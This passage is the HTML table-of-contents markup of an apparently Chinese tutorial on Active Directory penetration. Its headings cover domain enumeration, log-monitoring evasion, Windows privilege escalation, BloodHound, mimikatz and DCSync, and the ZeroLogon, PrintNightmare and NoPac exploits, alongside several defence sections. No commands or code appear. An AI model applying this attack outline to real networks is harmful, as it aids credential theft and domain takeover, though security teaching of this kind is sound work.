href="#1-%E5%88%97%E5%87%BA%E5%9F%9F%E5%86%85%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-number">3.3.1.</span> <span class="toc-text">(1) 列出域内计算机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%9A%E4%BD%8D%E7%89%B9%E5%AE%9A%E6%9C%8D%E5%8A%A1%E4%B8%BB%E6%9C%BA"><span class="toc-number">3.3.2.</span> <span class="toc-text">(2) 定位特定服务主机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%BB%84%E7%AD%96%E7%95%A5%EF%BC%88GPO%EF%BC%89%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.4.</span> <span class="toc-text">4. 组策略（GPO）枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89-GPO"><span class="toc-number">3.4.1.</span> <span class="toc-text">(1) 列出所有 GPO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E6%89%BE%E6%95%8F%E6%84%9F%E9%85%8D%E7%BD%AE"><span class="toc-number">3.4.2.</span> <span class="toc-text">(2) 查找敏感配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E4%B8%8E%E6%9E%97%E4%BF%A1%E6%81%AF"><span class="toc-number">3.5.</span> <span class="toc-text">5. 信任关系与林信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">3.5.1.</span> <span class="toc-text">(1) 域信任关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9E%97%E4%BF%A1%E6%81%AF"><span class="toc-number">3.5.2.</span> <span class="toc-text">(2) 林信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%B7%A5%E5%85%B7%E5%8C%96%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.6.</span> <span class="toc-text">6. 工具化枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-PowerView%EF%BC%88PowerShell-%E8%84%9A%E6%9C%AC%EF%BC%89"><span class="toc-number">3.6.1.</span> <span class="toc-text">(1) PowerView（PowerShell 脚本）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-BloodHound%EF%BC%88%E5%8F%AF%E8%A7%86%E5%8C%96%E5%88%86%E6%9E%90%EF%BC%89"><span class="toc-number">3.6.2.</span> <span class="toc-text">(2) BloodHound（可视化分析）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E9%9A%90%E8%94%BD%E6%9E%9A%E4%B8%BE%E6%8A%80%E5%B7%A7"><span class="toc-number">3.7.</span> <span class="toc-text">7. 隐蔽枚举技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LDAP-%E5%8C%BF%E5%90%8D%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.7.1.</span> <span class="toc-text">(1) LDAP 匿名查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7"><span class="toc-number">3.7.2.</span> <span class="toc-text">(2) 绕过日志监控</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.8.</span> <span class="toc-text">8. 关键信息示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">3.8.1.</span> <span class="toc-text">(1) 定位域管理员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E6%89%BE%E6%95%8F%E6%84%9F%E5%85%B1%E4%BA%AB"><span class="toc-number">3.8.2.</span> <span class="toc-text">(2) 查找敏感共享</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">3.9.</span> <span class="toc-text">防御建议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">四、本地权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.1.</span> <span class="toc-text">1. 基础信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95"><span class="toc-number">4.2.</span> <span class="toc-text">2. 常见提权手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E6%9C%AA%E4%BF%AE%E8%A1%A5%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.1.</span> <span class="toc-text">(1) 利用未修补的系统漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E6%BB%A5%E7%94%A8"><span class="toc-number">4.2.2.</span> <span class="toc-text">(2) 服务权限滥用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.3.</span> <span class="toc-text">(3) 计划任务提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-DLL%E5%8A%AB%E6%8C%81%EF%BC%88DLL-Hijacking%EF%BC%89"><span class="toc-number">4.2.4.</span> <span class="toc-text">(4) DLL劫持（DLL Hijacking）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BB%A4%E7%89%8C%E6%A8%A1%E6%8B%9F%EF%BC%88Token-Impersonation%EF%BC%89"><span class="toc-number">4.2.5.</span> <span class="toc-text">(5) 令牌模拟（Token Impersonation）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E6%BB%A5%E7%94%A8"><span class="toc-number">4.2.6.</span> <span class="toc-text">(6) 注册表键滥用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%88%A9%E7%94%A8%E8%87%AA%E5%8A%A8%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F%EF%BC%88Autoruns%EF%BC%89"><span class="toc-number">4.2.7.</span> <span class="toc-text">(7) 利用自动运行程序（Autoruns）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%85%B6%E4%BB%96"><span class="toc-number">4.2.8.</span> <span class="toc-text">(8) 其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7"><span class="toc-number">4.3.</span> <span class="toc-text">3. 自动化提权工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-PowerUp-ps1"><span class="toc-number">4.3.1.</span> <span class="toc-text">(1) PowerUp.ps1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Windows-Exploit-Suggester"><span class="toc-number">4.3.2.</span> <span class="toc-text">(2) Windows-Exploit-Suggester</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Metasploit"><span class="toc-number">4.3.3.</span> <span class="toc-text">(3) Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F"><span class="toc-number">4.3.4.</span> <span class="toc-text">(4) 土豆家族</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F%E6%A6%82%E8%BF%B0"><span class="toc-number">4.3.4.1.</span> <span class="toc-text">1. 土豆家族概述</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">4.3.4.1.1.</span> <span class="toc-text">核心原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%BC%9F%E2%BE%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%8F%90%E6%9D%83%E2%BC%AF%E5%85%B7"><span class="toc-number">4.3.4.1.2.</span> <span class="toc-text">⼟⾖系列漏洞与提权⼯具</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">4.3.4.2.</span> <span class="toc-text">2. 常见工具及利用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%B8%BB%E6%B5%81%E5%9C%9F%E8%B1%86%E5%B7%A5%E5%85%B7"><span class="toc-number">4.3.4.2.1.</span> <span class="toc-text">(1) 主流土豆工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.3.4.2.2.</span> <span class="toc-text">(2) 利用条件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%85%B8%E5%9E%8B%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">4.3.4.3.</span> <span class="toc-text">3. 典型攻击流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Print%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%8F%90%E6%9D%83%E2%BC%AF%E5%85%B7"><span class="toc-number">4.3.5.</span> <span class="toc-text">(5) Print系列漏洞与提权⼯具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">4.4.</span> <span class="toc-text">4. 防御建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%A4%BA%E4%BE%8B%EF%BC%9A%E5%88%A9%E7%94%A8PowerUp%E6%8F%90%E6%9D%83"><span class="toc-number">4.5.</span> <span class="toc-text">5. 示例：利用PowerUp提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94-%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B9%8BBloodhound"><span class="toc-number">5.</span> <span class="toc-text">五.域权限提升之Bloodhound</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-BloodHound-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="toc-number">5.0.1.</span> <span class="toc-text">1. BloodHound 核心概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86"><span class="toc-number">5.0.1.1.</span> <span class="toc-text">(1) 数据收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92"><span class="toc-number">5.0.1.2.</span> <span class="toc-text">(2) 核心分析视角</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%AE%9E%E6%88%98%E6%B5%81%E7%A8%8B"><span class="toc-number">5.0.2.</span> <span class="toc-text">2. 域权限提升实战流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE"><span class="toc-number">5.0.3.</span> <span class="toc-text">步骤1：新版安装配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE"><span class="toc-number">5.0.3.1.</span> <span class="toc-text">步骤1：安装与配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86"><span class="toc-number">5.0.3.2.</span> <span class="toc-text">步骤2：数据收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E5%85%B3%E9%94%AE%E6%9F%A5%E8%AF%A2%E4%B8%8E%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84"><span class="toc-number">5.0.3.3.</span> <span class="toc-text">步骤3：关键查询与攻击路径</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E6%89%80%E5%9C%A8%E4%B8%BB%E6%9C%BA"><span class="toc-number">5.0.3.3.1.</span> <span class="toc-text">(1) 查找域管理员所在主机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-ACL-%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">5.0.3.3.2.</span> <span class="toc-text">(2) ACL 滥用提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E9%9D%9E%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7%E5%88%B0%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84"><span class="toc-number">5.0.3.3.3.</span> <span class="toc-text">(3) 非特权用户到域控制器的攻击路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-Kerberoasting-%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="toc-number">5.0.3.3.4.</span> <span class="toc-text">(4) Kerberoasting 攻击目标</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E6%BB%A5%E7%94%A8-GPO-%E6%8F%90%E6%9D%83"><span class="toc-number">5.0.3.3.5.</span> <span class="toc-text">(5) 滥用 GPO 提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AE%9E%E6%88%98%E6%8F%90%E6%9D%83%E6%A1%88%E4%BE%8B"><span class="toc-number">5.0.4.</span> <span class="toc-text">3. 实战提权案例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B1%EF%BC%9A%E9%80%9A%E8%BF%87-ACL-%E6%8F%90%E6%9D%83%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">5.0.4.1.</span> <span class="toc-text">案例1：通过 ACL 提权到域管理员</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B2%EF%BC%9A%E5%88%A9%E7%94%A8%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">5.0.4.2.</span> <span class="toc-text">案例2：利用会话劫持横向移动</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">5.0.5.</span> <span class="toc-text">4. 防御建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%89%A9%E5%B1%95%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%8A%80%E5%B7%A7"><span class="toc-number">5.0.6.</span> <span class="toc-text">5. 扩展工具与技巧</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bmimikatz%E4%B8%93%E9%A2%98%E7%AE%80%E4%BB%8B"><span class="toc-number">6.</span> <span class="toc-text">六.内网渗透之mimikatz专题简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E4%B8%8E%E6%A8%A1%E5%9D%97"><span class="toc-number">6.1.</span> <span class="toc-text">1. 核心功能与模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%B8%E5%BF%83%E8%83%BD%E5%8A%9B"><span class="toc-number">6.1.1.</span> <span class="toc-text">(1) 核心能力</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B3%E9%94%AE%E6%A8%A1%E5%9D%97"><span class="toc-number">6.1.2.</span> <span class="toc-text">(2) 关键模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%85%B8%E5%9E%8B%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">6.2.</span> <span class="toc-text">2. 典型使用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">6.2.1.</span> <span class="toc-text">(1) 内网渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Windows-%E9%AB%98%E7%89%88%E6%9C%AC%E9%80%82%E9%85%8D"><span class="toc-number">6.2.2.</span> <span class="toc-text">(2) Windows 高版本适配</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E7%A4%BA%E4%BE%8B"><span class="toc-number">6.3.</span> <span class="toc-text">3. 常见攻击手法示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8F%90%E5%8F%96%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE"><span class="toc-number">6.3.1.</span> <span class="toc-text">(1) 提取本地用户凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Kerberoasting-%E6%94%BB%E5%87%BB"><span class="toc-number">6.3.2.</span> <span class="toc-text">(2) Kerberoasting 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-DCSync-%E6%94%BB%E5%87%BB%EF%BC%88%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%EF%BC%89"><span class="toc-number">6.3.3.</span> <span class="toc-text">(3) DCSync 攻击（域控权限）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1%E4%B8%8E%E6%A3%80%E6%B5%8B"><span class="toc-number">6.4.</span> <span class="toc-text">4. 防御与检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="toc-number">6.4.1.</span> <span class="toc-text">(1) 防护措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%A3%80%E6%B5%8B%E5%BB%BA%E8%AE%AE"><span class="toc-number">6.4.2.</span> <span class="toc-text">(2) 检测建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%B7%A5%E5%85%B7%E8%81%94%E5%8A%A8%E4%B8%8E%E6%89%A9%E5%B1%95"><span class="toc-number">6.5.</span> <span class="toc-text">5. 工具联动与扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">6.6.</span> <span class="toc-text">6. 注意事项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83-%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="toc-number">7.</span> <span class="toc-text">七.域权限提升漏洞篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-MS14-068"><span class="toc-number">7.1.</span> <span class="toc-text">1.MS14-068</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">7.1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">7.1.2.</span> <span class="toc-text">漏洞复现流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4"><span class="toc-number">7.1.3.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PAC%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">7.1.4.</span> <span class="toc-text">PAC扩展知识补充</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">7.1.5.</span> <span class="toc-text">防御与缓解措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%89%A9%E5%B1%95"><span class="toc-number">7.1.6.</span> <span class="toc-text">工具与扩展</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-CVE-2020-1472%EF%BC%88ZeroLogon%EF%BC%89"><span class="toc-number">7.2.</span> <span class="toc-text">2.CVE-2020-1472（ZeroLogon）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">7.2.1.</span> <span class="toc-text">漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">7.2.2.</span> <span class="toc-text">漏洞利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%8E%9F%E7%90%86"><span class="toc-number">7.2.3.</span> <span class="toc-text">关键技术与原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD-1"><span class="toc-number">7.2.4.</span> <span class="toc-text">防御与缓解措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%B8%8E%E8%B5%84%E6%BA%90"><span class="toc-number">7.2.5.</span> <span class="toc-text">工具与资源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-CVE-2021-1675-PrintNightmare"><span class="toc-number">7.3.</span> <span class="toc-text">3.CVE-2021-1675 (PrintNightmare)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">7.3.1.</span> <span class="toc-text">漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B-1"><span class="toc-number">7.3.2.</span> <span class="toc-text">漏洞利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%9C%AC%E8%B4%A8"><span class="toc-number">7.3.3.</span> <span class="toc-text">技术原理与漏洞本质</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD-2"><span class="toc-number">7.3.4.</span> <span class="toc-text">防御与缓解措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E5%A4%B1%E8%B4%A5%E5%B8%B8%E8%A7%81%E5%8E%9F%E5%9B%A0"><span class="toc-number">7.3.5.</span> <span class="toc-text">复现失败常见原因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-CVE-2021-42278-CVE-2021-42287%EF%BC%88NoPac%EF%BC%89"><span class="toc-number">7.4.</span> <span class="toc-text">4.CVE-2021-42278 + CVE-2021-42287（NoPac）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-number">7.4.1.</span> <span class="toc-text">漏洞原理概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">7.4.2.</span> <span class="toc-text">漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B-2"><span class="toc-number">7.4.3.</span> <span class="toc-text">漏洞利用流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">7.4.3.1.</span> <span class="toc-text">手动利用步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%EF%BC%88%E4%BB%A5noPac%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">7.4.3.2.</span> <span class="toc-text">自动化工具利用（以noPac为例）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8-sam-the-admin"><span class="toc-number">7.4.3.3.</span> <span class="toc-text">自动化工具利用(sam-the-admin)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">7.4.3.3.1.</span> <span class="toc-text">步骤 1：漏洞检测与初始化</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-TGT-%E7%A5%A8%E6%8D%AE"><span class="toc-number">7.4.3.3.2.</span> <span class="toc-text">步骤 2：请求伪造 TGT 票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-3%EF%BC%9A%E6%81%A2%E5%A4%8D%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E5%90%8D"><span class="toc-number">7.4.3.3.3.</span> <span class="toc-text">步骤 3：恢复机器账户名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-4%EF%BC%9A%E9%80%9A%E8%BF%87-S4U2Self-%E8%AF%B7%E6%B1%82%E9%AB%98%E6%9D%83%E9%99%90-ST"><span class="toc-number">7.4.3.3.4.</span> <span class="toc-text">步骤 4：通过 S4U2Self 请求高权限 ST</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-5%EF%BC%9A%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%88%96-DCSync"><span class="toc-number">7.4.3.3.5.</span> <span class="toc-text">步骤 5：执行远程命令或 DCSync</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD-3"><span class="toc-number">7.4.4.</span> <span class="toc-text">防御与缓解措施</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%B8%8E%E8%B5%84%E6%BA%90-1"><span class="toc-number">7.4.4.1.</span> <span class="toc-text">工具与资源</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 